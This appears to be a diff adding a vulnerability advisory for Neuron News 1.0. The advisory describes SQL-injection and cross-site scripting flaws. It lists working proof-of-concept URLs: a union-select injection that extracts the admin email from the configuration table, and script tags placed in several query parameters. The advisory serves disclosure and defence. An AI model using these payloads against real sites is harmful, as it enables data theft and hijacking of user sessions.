@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/26896/info
+
+Neuron News is prone to multiple input-validation vulnerabilities, including an SQL-injection issue and two cross-site scripting issues, because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+These issues affect Neuron News 1.0; other versions may also be affected. 
+
+http://www.example.com/patch/?q=&#039;/**/union/**/select/**/1,2,adminmail,4,id/**/from/**/neuronnews_configuration/*
+http://www.example.com/patch/?q=viewtopic&topic=<script>alert(111111)</script>
+http://www.example.com/patch/?q=newsarchive&newsyear=<script>alert(111111)</script>
+http://www.example.com/patch/?q=newsarchive&newsyear=<script>alert(111111)</script>&newsmonth=<script>alert(111111)</script>
